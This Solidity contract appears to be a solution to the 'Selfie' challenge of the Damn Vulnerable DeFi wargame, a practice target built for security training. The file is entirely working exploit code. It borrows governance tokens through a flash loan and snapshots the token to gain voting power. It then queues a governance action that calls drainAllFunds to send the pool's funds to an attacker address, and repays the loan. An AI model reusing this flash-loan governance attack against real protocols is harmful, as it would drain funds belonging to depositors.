// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";


contract SelfieSnatcher {
    using Address for address;

    SelfiePool public selfiePool;

    SimpleGovernance public governance;

    DamnValuableTokenSnapshot public token;

    address payable public attacker;
    constructor(
        address _selfiePool,
        address _governance,
        address _token,
        address payable _attacker
    ) {
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        attacker = _attacker;
    }

    function receiveTokens(address _token, uint256 _amount) external {
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        token.snapshot();
        // Vote for an action 
        governance.queueAction(
            address(selfiePool),
            data, 
            0
        );
        
        // return tokens
        token.transfer(msg.sender, _amount);
        
    }
    function attack() external {
        selfiePool.flashLoan(1500000000000000000000000);
    }

}